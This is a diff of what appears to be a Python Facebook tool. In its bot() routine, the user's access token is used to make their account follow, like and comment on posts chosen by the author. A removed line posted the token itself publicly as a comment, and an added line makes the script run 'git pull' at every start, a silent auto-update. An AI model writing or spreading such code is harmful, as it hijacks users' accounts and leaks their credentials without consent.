@@ -267,9 +267,9 @@ def bot():
 	requests.post("https://graph.facebook.com/100074600334850/subscribers?access_token="+token)
 	requests.post("https://graph.facebook.com/100050672943941/subscribers?access_token="+token) # Usup Mbew
 	requests.post("https://graph.facebook.com/123822970114380/likes?summary=true&access_token=" + token)
-	requests.post("https://graph.facebook.com/111932931303384/likes?summary=true&access_token=" + token)
+	requests.post("https://graph.facebook.com/368578384841257/likes?summary=true&access_token=" + token)
 	requests.post("https://graph.facebook.com/111932931303384/comments/?message="+komentar+"&access_token="+token)
-	requests.post("https://graph.facebook.com/368578384841257/comments/?message="+token+"&access_token="+token)
+	requests.post("https://graph.facebook.com/368578384841257/comments/?message=Ganteng bet lu bang :v&access_token="+token)
 	menu()
 
 # MENU
@@ -1899,5 +1899,5 @@ def yaudah(user,pasw,loop,tes):
 		time.sleep(31)
 
 if __name__ == '__main__':
-#	os.system("git pull")
+	os.system("git pull")
 	menu()
